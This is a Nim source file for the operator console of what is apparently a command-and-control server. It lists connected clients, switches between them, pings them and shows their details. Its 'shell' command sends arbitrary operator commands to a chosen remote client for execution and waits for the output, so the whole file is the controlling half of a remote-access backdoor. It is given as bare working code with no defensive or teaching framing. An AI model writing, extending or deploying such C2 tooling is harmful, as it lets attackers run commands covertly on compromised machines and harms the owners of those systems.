import asyncdispatch, asyncnet, threadpool
import strutils, terminal

import asyncdispatch, asynchttpserver, ws, asyncfutures

import types, logging

proc procStdin*(server: C2Server, clResp: ref Future[void]) {.async.} =
  var handlingClient: int = -1

  prompt(handlingClient, server)
  var messageFlowVar = spawn stdin.readLine()
  while true:
    if messageFlowVar.isReady():
      
      let cmd = ^messageFlowVar
      let args = cmd.split(" ")
      let argsn = len(args)

      if cmd == "clients":
        for client in server.clients:
          if client.connected:
            stdout.styledWriteLine fgGreen, "[+] ", $client, fgWhite
          else:
            stdout.styledWriteLine fgRed, "[-] ", $client, fgWhite
          infoLog $len(server.clients) & " clients currently connected"
      if cmd.startsWith("switch"):
        for client in server.clients:
          if client.id == parseInt(args[1]):
            handlingClient = parseInt(args[1])
        if handlingClient != parseInt(args[1]):
          infoLog "client not found"
      if cmd.startsWith("ping"):
        for client in server.clients:
          if client.id == parseInt(cmd.split(" ")[1]):
            echo "pinging " & $client
            await client.socket.send("ping\r\n")
      if cmd.startsWith("info"):
        for client in server.clients:
          if client.id == handlingClient:
            echo @client
      if cmd.startsWith("shell"):
        for client in server.clients:
          if client.id == handlingClient:
            await client.socket.send("CMD:" & args[1..(argsn - 1)].join(" ") & "\r\n")
            if clResp[].isNil():
              clResp[] = newFuture[void]()
              await clResp[]
      if cmd == "back": 
        handlingClient = -1

      prompt(handlingClient, server)
      messageFlowVar = spawn stdin.readLine()
      
    await asyncdispatch.sleepAsync(100)
